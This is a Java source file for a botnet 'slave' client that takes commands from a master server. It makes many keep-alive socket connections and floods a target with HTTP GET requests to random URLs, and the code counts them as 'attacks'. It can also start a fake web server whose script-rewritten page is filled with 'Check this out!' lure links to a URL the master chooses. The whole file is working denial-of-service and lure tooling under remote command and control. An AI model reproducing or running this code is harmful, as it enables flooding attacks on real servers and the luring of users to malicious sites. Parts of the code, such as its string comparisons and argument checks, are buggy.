import java.io.*;
import java.net.*;
import java.util.*;

class infoServer
{
    private String host_name;
    private int port;
    private Socket s;
    public infoServer(String host_name,int port,Socket s)
    {
        this.host_name = host_name;
        this.port = port;
        this.s = s;
    }
    public String getHostname()
    {
        return host_name;
    }
    public int getPortNumber()
    {
        return port;
    }
    public Socket gets()
    {
        return s;
    }
}

public class Slave extends Thread
{
	static ServerSocket NewWeb;
	static int portS = 0;
	static String url1="null";
	public Slave(String url1, ServerSocket NewWeb) {
		this.url1 = url1;
		this.NewWeb = NewWeb;
	}
	static List<Socket> socklist = new ArrayList<Socket>();
    public static void main(String args[]) throws IOException
    {
    	String ip_address="127.0.0.1";
        int port = 8080;
		if(args.length !=4)
		{
			System.out.println("Invalid parameters");
			System.exit(-1);
		}
        if(args.length == 4 && args[0].equals("-h") || args[2].equals("-p"))
        {
        	for (int i = 0; i < args.length; i++)
        	{
        		if(args[i].equals("-p"))
        		{
        			port = Integer.parseInt(args[i+1]);

        		}
        		else if(args[i].equals("-h"))
        		{
        			ip_address=args[i+1];
        		}
        	}
			System.out.println("Connected to the Master");
        }
        else
		{
			System.out.println("Improper Format.");
			System.exit(-1);
		}
        ArrayList<infoServer> server_info = new ArrayList<infoServer>();
        String s1;
		Socket s = null;		
		try
        {
			while (true)
            {
				s = new Socket(ip_address, port);  
				BufferedReader BR= new BufferedReader(new InputStreamReader(s.getInputStream()));
                s1 = BR.readLine();
                if (s1 == null)
                    continue;                
                String host_ip;
                int server_port, number_of_attacks;
				final String s1_split[] = s1.split(" ");
                switch (s1_split[0])
                {
                case "connect":
                    if (s1_split[1].equals("localhost") || s1_split[1].equals("all")|| s1_split[1].equals("127.0.0.1")) 
					{
						//keepalive and no. of attacks given
						if(s1_split.length == 6 && s1_split[5].equals("keepalive"))
						{							
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = Integer.parseInt(s1_split[4]);
							for(int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String str = "http://" + host_ip.substring(4);
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
								}
							}
						}						
						else if(s1_split.length==6 && s1_split[4].equals("keepalive") && s1_split[5].substring(0, 4).equals("url="))
						{
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = 1;
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String random = randomString_generation();
									String str = "http://" + host_ip.substring(4) + s1_split[5].substring(4) + random;
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);
								}
							}
						}
						else if(s1_split.length == 7 && s1_split[6].substring(0, 4).equals("url=")&& s1_split[5].equals("keepalive"))
						{
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = Integer.parseInt(s1_split[4]);
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String random = randomString_generation();
									String str = "http://" + host_ip.substring(4) + s1_split[6].substring(4) + random;
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);
								}
							}
						}
						else if(s1_split.length == 6 && s1_split[5].substring(0, 4).equals("url="))
						{
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = Integer.parseInt(s1_split[4]);
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
								String random = randomString_generation();
								String str = "http://" + host_ip.substring(4) + s1_split[5].substring(4) + random;
								int message;
								URL url = new URL(str);
								HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
								url_Connection.setRequestMethod("GET");
								url_Connection.connect();
								message = url_Connection.getResponseCode();
								response(url);								
							}
						}						
						else if(s1_split.length == 5 && s1_split[4].equals("keepalive"))
						{
							//number of attacks not specified
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = 1;
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String str = "http://" + host_ip.substring(4);
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
								}
							}
						}		
						///////
						else if (s1_split.length == 5 && s1_split[4].substring(0,1).equals("u")) 
						{
							if (s1_split[4].substring(0, 4).equals("url=")) 
							{
								//number of attacks not specified
								host_ip = s1_split[2];
								server_port = Integer.parseInt(s1_split[3]);
								number_of_attacks = 1;
								for (int i = 0; i< number_of_attacks; i++)
								{
									Socket new_socket = new Socket(host_ip, server_port);
									infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
									server_info.add(infoServer);
									String random = randomString_generation();
									String str = "http://" + host_ip.substring(4) + s1_split[4].substring(4) + random;
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);	
								}
							}
							else
							{
								System.exit(-1);
							}
						}
						else if(s1_split.length==5)
						{
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = Integer.parseInt(s1_split[4]);
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
							}
						}
						else if(s1_split.length == 4)
						{
							host_ip = s1_split[2];
							server_port = Integer.parseInt(s1_split[3]);
							number_of_attacks = 1;
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, server_port);
								infoServer infoServer = new infoServer(host_ip, server_port, new_socket);
								server_info.add(infoServer);
							}
						}
						else 
						{
							System.exit(-1);
						}
					}
					else
					{
						System.exit(-1);
					}					
					continue;
				    
					
		        case "disconnect":
					if(s1_split[1].equals("localhost")||s1_split[1].equals("all")||s1_split[1].equals("127.0.0.1"))
					{
                	host_ip = s1_split[2];
                    ArrayList<infoServer> connections_remove = new ArrayList<infoServer>();
                    if(s1_split.length == 3)
                    {
                        for(infoServer infoServer : server_info)
                        {
                            if(host_ip == infoServer.getHostname())
                            {
                            	infoServer.gets().close();
                                connections_remove.add(infoServer);                                
                            }
                        }
                        for(infoServer infoServer : connections_remove)
                        {
                        	server_info.remove(infoServer);
                        }
                    }
                    else if(s1_split.length==4)
                    {
                        server_port = Integer.parseInt(s1_split[3]);
                        for(infoServer infoServer : server_info)
                        {
                            if(host_ip == infoServer.getHostname() && server_port == infoServer.getPortNumber())
                            {
                            	infoServer.gets().close();
                            	connections_remove.add(infoServer);                            	
                            }
                        }
                        for(infoServer infoServer : connections_remove)
                        {
                        	server_info.remove(infoServer);
                        }
                    }
					else
					{
						System.exit(-1);
					}
					}
					else
					{
						System.exit(-1);
					}
                    continue;	
		  case "rise-fake-url": 
		  case "down-fake-url":
			//	        BufferedReader command= new BufferedReader(new InputStreamReader(s.getInputStream()));
						if((s1_split[0].equals("rise-fake-url") || s1_split[0].equals("down-fake-url")))
						{
							if(s1_split[0].equals("rise-fake-url"))
							{
								try
								{
							 url1= s1_split[2];	
							 portS=Integer.parseInt(s1_split[1]);
							 System.out.println("Rising Fake URL Websites");
							 NewWeb = new ServerSocket(portS);
							 Slave S1=new Slave(url1,NewWeb);
							 S1.start();
								}
								catch(Exception e)
								{
									System.err.println(e);
								}
							Thread thread= new Thread(new Runnable() {
								public void run()	
								{
										Socket clientSocket;
									while(true)
									{
										try
										{
											if(!NewWeb.isClosed())
											{
												clientSocket = NewWeb.accept();
												socklist.add(clientSocket);
												PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
												String html = "<html>\r\n" + 
										    			"<head>\r\n" + 
										    			"<title>Test Page</title>\r\n" + 
										    			" <script language=\"Javascript\">\r\n" + 
										    			"      <!--\r\n" + 
										    			"      var newContent='<html><head><script language=\"Javascript\">function One()</script>"+
										    			"		</head><body onload=\"One();\">"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		<a href=\"http://" + url1 + "\">Check this out!</a>"+
										    			"		</body></html>';\r\n" + 
										    			"      function ReplaceContent(NC) {\r\n" + 
										    			"        document.write(NC);\r\n" + 
										    			"        document.close();\r\n" + 
										    			"      }\r\n" + 
										    			"      function One() {\r\n" + 
										    			"        ReplaceContent(newContent);\r\n" + 
										    			"      }\r\n" + 
										    			"      -->\r\n" + 
										    			"    </script> \r\n" + 
										    			"</head>\r\n" + 
										    			"<body>\r\n" +
										    			"<hr>\r\n"+
										    			"<a href=\"javascript:One()\">Check this out!</a>\r\n" + 
										    			"<a href=\"javascript:One()\">Check this out!</a>\r\n" + 
										    			"<hr>\r\n" +  
										    			"</body>\r\n" + 
										    			"</html>";
												out.println("HTTP/1.1 200 OK");
												out.println("Content-Type: text/html");
												out.println("\r\n");
												out.println(html);
												//out.flush();
												out.close();
											}
										}			
											catch(IOException e)
											{
													System.out.println("Server is down! No more fake URL!");
											}
									}
								
								}
							});	
							thread.start();
							}
									else if(s1_split[0].equals("down-fake-url"))
									{
										try
										{
											for(Socket so: socklist)
											{
												so.close();
											}
											
											NewWeb.close();
											Slave Sl2 = new Slave(url1, NewWeb);
											Sl2.interrupt();
											System.out.println("Server Disconnected");
										}
											catch(IOException ex)
											{
												ex.printStackTrace();
											}
											catch(Exception e)
											{
												System.err.println(e);
											}
									}
						}
						continue;
					}
				} 
        }	catch(Exception e)
				{
					System.err.println(e);
				}
			}				
	public static String randomString_generation()
	{
		String str1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		Random r = new Random();
		int num = r.nextInt(10) + 1;
		String random_str = "";
		for(int i = 0; i < num; i++)
		{ 
			char c = str1.charAt(r.nextInt(52));
			random_str = random_str + c;
		}
		return random_str;
	}	
	public static void response(URL url)throws IOException
	{
		try{
			Scanner sc = new Scanner(url.openStream());
			while(sc.hasNext())
			{
				sc.nextLine();
			}
			sc.close();
		}catch(IOException e){
			System.exit(-1);
		}
    }
}	